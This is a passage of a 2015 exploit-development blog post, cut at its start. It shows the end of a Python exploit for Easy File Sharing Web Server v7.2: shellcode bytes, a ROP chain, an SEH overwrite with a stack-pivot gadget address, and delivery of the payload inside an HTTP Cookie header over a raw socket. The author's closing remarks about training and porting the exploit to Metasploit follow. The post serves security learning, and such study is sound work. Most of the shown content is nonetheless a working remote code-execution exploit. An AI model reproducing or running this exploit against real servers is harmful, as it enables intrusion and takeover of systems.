</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x55\xe3\xe1\xce\x1f\xe6\xae\x48\xf3\x9a\xbf\x3c\xf3</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x09\xbf\x14\x90\xcc\x53\xf4\x79\x6b\xd4\x9f\x85</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                              <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x1002280a</span><span class="p">)</span>          <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">httpreq</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'><span class="s">&quot;GET /changeuser.ghp HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;User-Agent: Mozilla/4.0</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Host:&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept-Language: en-us</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Referer: http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">&quot;/</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Cookie: SESSIONID=6771; UserID=&quot;</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="s">&quot;; PassWD=;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Conection: Keep-Alive</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Send payload to the server</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">httpreq</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I had a lot of fun writing the exploit, I learnt couple new things and also treated it as a bit of a practice after what I&rsquo;ve learned at the before mentioned <a href="https://www.corelan-training.com/index.php/training-2/bootcamp/">Corelan Bootcamp</a> training (which was <strong>AWESOME</strong> and would highly recommend it to anyone interested in exploit development).</p>

<p>Next on the cards is converting the above exploit into Metasploit module and finding some other PoC&rsquo;s that I may be able to convert to properly working exploits.</p>

<p>Ah, only if I could fit some more hours in the day!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Knapsy</span></span>

      




<time class='entry-date' datetime='2015-11-25T20:46:41+11:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:46 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/exploit-development/'>exploit development</a>, <a class='category' href='/blog/categories/rop/'>rop</a>, <a class='category' href='/blog/categories/seh/'>seh</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/" data-via="TheKnapsy" data-counturl="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/03/29/oscp-thoughts-and-tips/" title="Previous Post: OSCP - Thoughts and tips">&laquo; OSCP - Thoughts and tips</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/02/24/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells-sectalks-melbourne-0x01-2016/" title="Next Post: Escape from SHELLcatraz - Breaking Out of Restricted Unix Shells (SecTalks Melbourne 0x01 2016)">Escape from SHELLcatraz - Breaking Out of Restricted Unix Shells (SecTalks Melbourne 0x01 2016) &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <p><img src="https://pbs.twimg.com/profile_images/1026331713549389824/sxjd08KY_bigger.jpg" align="right"/><strong>Knapsy</strong> (<u><a href="http://twitter.com/TheKnapsy">@TheKnapsy</a></u>)<br/>
  IT security guy, pentester, coder, basketballer, coffee enthusiast. Creative, bit nuts, sleep deprived.</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/08/05/filevault-ctf-challenge-elf-x64-buffer-overflow/">FileVault CTF Challenge - ELF X64 Buffer Overflow</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/">QuickZip 4.60 - Win7 X64 SEH Overflow (Egghunter) With Custom Encoder</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/24/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells-sectalks-melbourne-0x01-2016/">Escape From SHELLcatraz - Breaking Out of Restricted Unix Shells (SecTalks Melbourne 0x01 2016)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/">Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP Bypass With ROP)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/29/oscp-thoughts-and-tips/">OSCP - Thoughts and Tips</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>Latest Tweets</h1>
  <p><a class="twitter-timeline" href="https://twitter.com/TheKnapsy" data-widget-id="517677537711767552">Tweets by @TheKnapsy</a></p>
  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
</section>






  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - Knapsy -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'knapsysbraindump';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/';
        var disqus_url = 'http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
